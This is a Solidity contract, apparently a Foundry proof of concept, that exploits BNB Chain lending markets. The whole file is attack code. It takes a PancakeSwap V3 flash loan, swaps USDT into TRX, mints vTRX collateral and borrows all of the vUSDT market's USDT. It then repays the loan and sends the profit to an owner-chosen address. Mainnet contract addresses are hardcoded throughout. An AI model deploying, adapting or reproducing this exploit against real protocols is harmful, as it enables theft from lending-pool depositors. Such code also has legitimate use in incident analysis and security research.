//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

interface VTokenInterface {
    function getAccountSnapshot(address account)
        external
        view
        returns (uint256 error, uint256 vTokenBalance, uint256 borrowBalance, uint256 exchangeRate);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions public USDT_WBNB_POOL = IUniswapV3PoolActions(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    IUniswapV2Router public constant uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    ERC20 public constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 public constant TRX = ERC20(0xCE7de646e7208a4Ef112cb6ed5038FA6cC6b12e3);

    VTokenInterface public constant VUSDT = VTokenInterface(0x281E5378f99A4bc55b295ABc0A3E7eD32Deba059);
    VTokenInterface public constant VTRX = VTokenInterface(0x836beb2cB723C498136e1119248436A645845F4E);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(uniswapRouter), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(uniswapRouter), 0);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        uint256 borrowAmount = abi.decode(data, (uint256));

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(TRX), USDT.balanceOf(address(this)), address(this)
        );

        uint256 usdtBalanceBefore = TRX.balanceOf(address(this));
        console.log("TRX Balance before =>", usdtBalanceBefore);

        uint256 balanceBefore = TRX.balanceOf(address(this));
        console.log("Balance before =>", balanceBefore / 1 ether);
        TRX.approve(address(VTRX), TRX.balanceOf(address(this)));
        VTRX.mint(TRX.balanceOf(address(this)));
        uint256 balanceAfter = TRX.balanceOf(address(this));
        console.log("TRX change =>", (balanceBefore - balanceAfter) / 1 ether);

        (uint256 error, uint256 vTokenBalance, uint256 borrowBalance, uint256 exchangeRate) =
            VTRX.getAccountSnapshot(address(this));
        console.log("error =>", error);
        console.log("vTokenBalance =>", vTokenBalance / 1 ether);
        console.log("borrowBalance =>", borrowBalance / 1 ether);
        console.log("exchangeRate =>", exchangeRate);

        VUSDT.borrow(USDT.balanceOf(address(VUSDT)));

        require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    function main(uint256 flashLoanAmount, address withdrawAddress) public onlyOwner {
        flashLoanAmount = flashLoanAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount);

        USDT_WBNB_POOL.flash(address(this), flashLoanAmount, 0, params);

        USDT.transfer(withdrawAddress, USDT.balanceOf(address(this)));

        console.log("Profit =>", (USDT.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }
}
